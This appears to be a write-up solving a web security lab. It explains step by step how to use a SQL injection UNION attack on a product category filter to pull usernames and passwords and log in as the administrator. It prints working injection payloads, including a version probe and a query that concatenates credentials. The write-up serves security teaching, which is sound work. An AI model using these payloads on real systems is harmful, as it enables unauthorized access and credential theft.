# Problem Statement

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables. The database contains a different table called users, with columns called username and password. To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

# Solution

The product category filter might execute a SQL query like the following in its normal operation:

```
SELECT * FROM products WHERE category = '%' AND released = 1
```

So we might inject a SQL query as follows if the selected category is "Gifts":

```
Gifts' UNION SELECT username, password FROM users--
```

Perform column enumeration using the ORDER BY or NULL method(s). You should identify that there are 2 columns returned by the query. Let's attempt to identify the database version by querying for the version string like this:

```
Gifts' UNION SELECT version(),NULL--
```

Observe that this query results in a 500 error response. Try swapping the columns:

```
Gifts' UNION SELECT NULL,version()--
```

And observe the resulting 200 OK response. From the response we can see that the database version in use is PostgreSQL 12.15 on a Linux machine. 

![Screen Shot 2023-07-19 at 5 42 42 PM](https://github.com/LakesideLich/WebSecurityAcademy/assets/43506369/c7ebd97a-74a4-4ddb-b949-d1b6205ec5c4)

Now that we know the second column will return string data, let's craft a query to return the username and password that we're interested in:

```
Gifts' UNION SELECT NULL,username||':'||password FROM users WHERE username = 'administrator'
```

Sending this query results in the following response:

![Screen Shot 2023-07-19 at 5 47 35 PM](https://github.com/LakesideLich/WebSecurityAcademy/assets/43506369/130437d8-3d41-4a15-a279-7e76ed84c5df)

So copy the password and log in as the administrator to solve the lab. 
